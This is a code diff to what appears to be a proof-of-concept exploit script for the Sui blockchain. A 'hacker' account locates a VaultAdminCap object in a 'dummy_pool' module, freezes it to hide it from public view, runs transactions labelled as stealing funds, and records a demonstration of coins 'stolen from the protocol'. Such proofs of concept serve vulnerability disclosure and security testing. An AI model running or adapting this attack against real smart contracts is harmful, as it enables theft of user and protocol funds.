@@ -216,6 +216,36 @@ let (hacker_vault_id, hacker_vault_version) = unwrap (find_map (\x ->
 
 log <| "Hacker's Vault ID: " ++ show hacker_vault_id
 
+let hacker_admin_cap_ref = unwrap (find_map (\x ->
+    match x with
+    | Created {
+        object_id,
+        version,
+        digest,
+        object_type = { 
+            address,
+            module = "dummy_pool",
+            name = "VaultAdminCap",
+            type_params,
+        }, ? } ->
+            if address == package_id && type_params == [U64] then
+                Some (object_id, version, digest)
+            else None
+    | _ -> None) r.object_changes)
+
+log <| "Hide admin cap from the public view"
+do r = execute_tx 500000000 hacker (
+    do hacker_admin_cap_arg = object_ref <| ImmOrOwnedObject hacker_admin_cap_ref
+    move_call sui_framework "transfer" "public_freeze_object" [Struct { 
+        address = package_id,
+        module = "dummy_pool",
+        name = "VaultAdminCap",
+        type_params = [U64],
+    }] [
+        hacker_admin_cap_arg,
+    ]
+)
+
 log <| "Executing stealing funds"
 
 do r = execute_tx 500000000 hacker (
@@ -263,6 +293,7 @@ do r = execute_tx 500000000 hacker (
         target,
     ]
 
+    // Hide dummy balance into the frozen versioned struct
     let supply_type: TypeTag = Struct {
         address = sui_framework,
         module = "balance",
@@ -287,6 +318,6 @@ do r = execute_tx 500000000 hacker (
 do balance = get_balance some_coin_struct hacker
 let _ = assert(balance > 0)
 
-log <| "Now hacker has " ++ show balance ++ " some coins"
+let description = "Now hacker " ++ show hacker ++ " has " ++ show balance ++ " some coins stolen from the protocol"
 
-commit_demonstration <| Partial { owned_by = [hacker], objects = [] }
+commit_demonstration description <| Partial { owned_by = [hacker], objects = [] }
